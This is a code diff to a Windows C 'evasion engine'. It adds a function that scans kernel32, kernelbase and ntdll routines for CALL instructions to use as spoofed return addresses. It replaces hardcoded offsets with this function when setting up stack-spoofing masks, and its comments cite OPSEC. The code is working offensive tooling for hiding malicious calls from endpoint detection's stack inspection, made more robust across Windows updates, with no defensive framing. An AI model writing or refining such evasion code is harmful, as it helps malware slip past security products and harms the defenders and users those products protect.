@@ -153,6 +153,34 @@ PVOID FindValidGadgetInModule(const char* sModule, DWORD* outType, DWORD minFram
     return NULL;
 }
 
+// Scans a function's memory looking for a CALL instruction to use as a spoofed return address.
+// This prevents hardcoding offsets which can break across Windows updates.
+PVOID SeekReturnAddress(PVOID pBase) {
+    if (!pBase) return NULL;
+    
+    PBYTE pBytes = (PBYTE)pBase;
+    
+    // Scan up to 256 bytes deep into the function body
+    for (int i = 0; i < 256; i++) {
+        // Look for 'CALL QWORD PTR [RIP+offset]' (Opcode: FF 15)
+        // This is heavily used in kernel32/kernelbase to call NTDLL functions
+        if (pBytes[i] == 0xFF && pBytes[i+1] == 0x15) {
+            // The instruction is 6 bytes long. The return address is immediately after.
+            return (PVOID)(pBytes + i + 6);
+        }
+        
+        // Look for relative 'CALL' (Opcode: E8)
+        if (pBytes[i] == 0xE8) {
+            // The instruction is 5 bytes long.
+            return (PVOID)(pBytes + i + 5);
+        }
+    }
+    
+    // Fallback to the function prologue if no CALL is found.
+    // Suboptimal for OPSEC, but ensures the engine doesn't crash.
+    return pBase;
+}
+
 // Initializes the evasion engine, locates gadgets, masks and parses NTDLL
 BOOL InitEngine() {
     PVOID ntdllBase = GetModuleHandleA("ntdll.dll");
@@ -168,21 +196,22 @@ BOOL InitEngine() {
     HMODULE hK32 = GetModuleHandleA("kernel32.dll");
     HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
     
-    // Initialize global spoofing masks
-    Mask_Security.pAddress = (PVOID)((ULONG_PTR)GetProcAddress(hKBase, "VirtualProtectEx") + 0x4B);
-    Mask_Worker.pAddress = (PVOID)GetProcAddress(hK32, "WaitForSingleObjectEx");
-    Mask_Memory.pAddress = (PVOID)GetProcAddress(hK32, "MapViewOfFile");
-    Mask_File.pAddress = (PVOID)GetProcAddress(hK32, "CreateFileW");
+    // Initialize global spoofing masks dynamically
+    // Instead of hardcoding +0x4B or using raw prologues, we dynamically seek a valid Return Address
+    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hKBase, "VirtualProtectEx"));
+    Mask_Worker.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "WaitForSingleObjectEx"));
+    Mask_Memory.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "MapViewOfFile"));
+    Mask_File.pAddress     = SeekReturnAddress(GetProcAddress(hK32, "CreateFileW"));
 
-    // Calculate frame sizes for the masks
+    // Calculate exact frame sizes for the masks based on the new Return Addresses
     Mask_Security.dwFrameSize = CalcFrameSize(Mask_Security.pAddress);
-    Mask_Worker.dwFrameSize = CalcFrameSize(Mask_Worker.pAddress);
-    Mask_Memory.dwFrameSize = CalcFrameSize(Mask_Memory.pAddress);
-    Mask_File.dwFrameSize = CalcFrameSize(Mask_File.pAddress);
+    Mask_Worker.dwFrameSize   = CalcFrameSize(Mask_Worker.pAddress);
+    Mask_Memory.dwFrameSize   = CalcFrameSize(Mask_Memory.pAddress);
+    Mask_File.dwFrameSize     = CalcFrameSize(Mask_File.pAddress);
     
-    // Configure Stack Spoofing basis
-    qThreadBase = (PVOID)((ULONG_PTR)GetProcAddress(hK32, "BaseThreadInitThunk") + 0x14);
-    qRtlUserThreadStart = (PVOID)((ULONG_PTR)GetProcAddress(ntdllBase, "RtlUserThreadStart") + 0x21);
+    // Configure Stack Spoofing basis dynamically
+    qThreadBase = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(hK32, "BaseThreadInitThunk")));
+    qRtlUserThreadStart = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(ntdllBase, "RtlUserThreadStart")));
     
     if(!qThreadBase || !qRtlUserThreadStart) return FALSE;
     
